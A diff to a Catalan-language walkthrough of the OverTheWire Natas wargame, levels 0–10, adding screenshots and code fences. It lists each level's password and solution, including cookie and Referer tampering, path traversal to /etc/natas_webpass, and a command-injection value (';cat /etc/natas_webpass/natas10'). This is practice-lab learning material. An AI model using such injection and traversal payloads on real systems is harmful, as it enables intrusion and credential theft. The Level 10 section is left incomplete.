@@ -1,7 +1,8 @@
 # LEVEL 0
 
-Inspeccionem l'element i podrem veure un comentari en el div "content", la password és:
+Inspeccionem l'element i podem veure un comentari en el div "content".
 
+![Level0](img/level0.png)
 ```
 g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
 ```
@@ -10,6 +11,7 @@ g9D9cREhslqBKtcA2uocGHPfMZVzeFK6
 
 Al estar bloquejat el click dret fiquem 
 view-source:http://natas1.natas.labs.overthewire.org/
+![Level1](img/level1.png)
 
 ```
 h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
@@ -17,7 +19,8 @@ h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7
 
 # LEVEL 2
 
-Inspeccionem i veiem que carrega una imatge i té la ruta de /files. Accedim i veiem que en aquest directori hi ha un fitxer users.txt
+Inspeccionem i veiem que carrega una imatge que té la ruta de /files. Accedim i veiem que en aquest directori hi ha un fitxer users.txt
+![Level2](img/level2.png)
 
 ```
 # username:password
@@ -32,6 +35,7 @@ mallory:9urtcpzBmH
 # LEVEL 3
 
 En el codi no trobem res, mirem el robots.txt i viem que surt /s3cr3t/ entrem en aquest directori i trobem el fitxer users.txt amb la password.
+![Level3](img/level3.png)
 
 ```
 tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
@@ -39,7 +43,7 @@ tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm
 
 # LEVEL 4
 
-Modifiquem la petició amb el BurpSuite ja que ens diu que només accepta peticions del natas5 i modifiquem el referer per http://natas5.natas.labs.overthewire.org/
+Modifiquem la petició amb el BurpSuite ja que ens diu que només accepta peticions del natas5, modifiquem el referer per http://natas5.natas.labs.overthewire.org/
 
 ```
 Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
@@ -48,8 +52,10 @@ Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD
 
 # LEVEL 5
 
-Mirem la petició amb el BurpSuite, veiem que té un parametre que té el valor 0, li fiquem el valor 1 i ja podem entrar .Cookie: loggedin=0
-
+Mirem la petició amb el BurpSuite, veiem que té un parametre que té el valor 0, li fiquem el valor 1 i ja podem entrar.
+```
+Cookie: loggedin=0
+```
 ```
 fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR
 ```
@@ -75,7 +81,7 @@ http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas
 a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB
 ```
 # LEVEL 8
-
+```
 <?php
 function encodeSecret($secret) {
     return bin2hex(strrev(base64_encode($secret)));
@@ -86,20 +92,23 @@ function decode($secret){
 }
 
 echo (decode("3d3d516343746d4d6d6c315669563362"));
-
+```
 ```
 Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd
 ```
 # LEVEL 9
+```
 ;cat /etc/natas_webpass/natas10
 
+```
 ```
 D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE
 ```
 
 # LEVEL 10
+```
 a /etc/natas_webpass/natas10
-
+```
 natas
 
 
